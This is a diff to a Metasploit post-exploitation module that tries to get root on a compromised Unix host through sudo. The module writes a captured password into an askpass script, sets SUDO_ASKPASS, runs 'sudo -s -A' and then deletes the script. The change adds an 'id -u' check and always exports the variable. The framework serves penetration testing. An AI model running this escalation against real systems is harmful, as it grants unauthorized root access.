@@ -48,6 +48,7 @@ class Metasploit3 < Msf::Post
 	def run
 		print_status("SUDO: Attempting to upgrade to UID 0 via sudo")
 		sudo_bin = cmd_exec("which sudo")
+		my_id = cmd_exec("id -u")
 		if is_root?
 			print_status "Already root, so no need to upgrade permissions. Aborting."
 			return
@@ -98,10 +99,9 @@ class Metasploit3 < Msf::Post
 					cmd_exec("echo echo #{password} >> #{askpass_sh}")
 					cmd_exec("chmod +x #{askpass_sh}")
 					vprint_status "Setting environment variable."
-					# Bruteforce-set the environment variable? is cmd_exec() always
-					# going to be in the context of /bin/sh ?
+					# Bruteforce-set the environment variable with both setenv and export.
 					askpass_env = cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}") 
-					cmd_exec("export SUDO_ASKPASS=#{askpass_sh}") if askpass_env.to_s.empty?
+					cmd_exec("export SUDO_ASKPASS=#{askpass_sh}")
 					vprint_status "Executing sudo -s -A"
 					cmd_exec("sudo -s -A")
 					vprint_status "Deleting the askpass script."
